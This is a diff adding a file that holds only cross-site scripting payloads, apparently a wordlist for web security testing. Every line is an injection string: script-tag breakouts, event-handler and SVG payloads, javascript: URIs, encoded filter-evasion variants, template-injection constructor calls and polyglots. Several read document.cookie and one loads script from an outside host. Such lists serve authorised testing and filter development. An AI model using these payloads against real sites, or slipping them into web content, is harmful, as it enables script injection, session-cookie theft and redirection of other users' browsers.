@@ -1,0 +1,56 @@
+%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
+/><svg src=x onload=confirm(document.domain);>
+javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie
+<Svg Only=1 OnLoad=confirm(1)>
+"><img src onerror=alert(1)>
+"autofocus onfocus=alert(1)//
+</script><script>alert(1)</script>
+'-alert(1)-'
+\'-alert(1)//
+javascript:alert(1)
+"><svg/onload=alert(1)>
+<img>/><svg/onload=alert(1)>
+"></\/\</script><script>alert(1)</script>
+"><script>alert("xss");</script>
+<div onmouseover="alert('XSS');">Hello :) 
+<input/%00/autofocus=""/%00/onfocus=.1|alert`XSS`>
+​​"><svg/onload=prompt(5);> 
+<svg/onload=alert(1)>
+</div><svg/onload=alert(1)>
+<a href=#>link</a><input type=x>
+javascript%3Aalert%2F**%2F(document.domain)
+<svg/onload = alert(1);>
+"><script>alert(window.location.href=("https://bing.com"))</script>
+"><script>alert(window.location.replace=("https://bing.com"))</script>
+"<svg/onload=alert(kxss)"@x.y
+</textarea><ScRiPt>prompt(/89/)</ScRiPt//
+"><iframe/onload=alert(document.domain)//
+">><marquee><img src=x onerror=confirm(1)></marquee>>
+}}})</script><script>alert(1)</script>
+"style="position:fixed;top:0;left:0;border:999em solid green;" onmouseover="alert(document.domain)"
+{{_c.constructor('alert(1)')()}}
+{{constructor.constructor('alert(1)')()}}
+"><iframe src=javascript:prompt(document.cookie)>
+"><img src="x" onerror="window.open('https://bing.com');">
+"onmouseover=alert(document.cookie)//
+<a href="http://google.com" onclick="alert(document.cookie)">
+%22%20style=%22animation-name:swoop-up%22%20onanimationstart=%22alert(document.domain)
+<svg><style><script>alert(1)</script></style></svg>
+<math><style><img src onerror=alert(2)></style></math>
+"onmouseleave="alert(1)"
+javascript://’//” →</textarea></style></script></title><b onclick= alert()//>*/alert()/*
+javascript://</title>”/</script></style></textarea/ →*/<alert()/*’ onclick=alert()//>/
+javascript://</title></style></textarea> →</script><a”//’ onclick=alert()//>*/alert()/*
+javascript://’/</title></style></textarea></script> →<p” onclick=alert()//>*/alert()/*
+javascript:// →</title></style></textarea></script><svg “//’ onclick=alert()//
+javascript:/* →</title></style></textarea></script></xmp><svg/onload=’+//+/onmouseover=1/+/[*/[]/+alert(1)//’>
+javascript:/* →</title></style></textarea></script></xmp><svg/onload=’+/”/+/onmouseover=1/+/[*/[]/+alert(1)//’>
+javascript://</title></textarea></style></script →<li ‘//” ‘*/alert()/*’, onclick=alert()//
+javascript:\u0061lert(1)
+"'--!><Script /K/>confirm(1)</Script /K/>
+'"--!><Body /Onpageshow=confirm'1'>
+'"--!><Svg><Set /Onbegin=confirm'1'>
+"'--!><Html/Onmouseenter=confirm'1'//>"
+'"--!></Script%0C><Script/Src=https:knoxss.me/1>
+'"--!></Script/><Svg/Onload=confirm'1'//
+">]<img src=x onerror=alert(document.domain)> ">]<img src=x onerror=alert(document.cookie)>
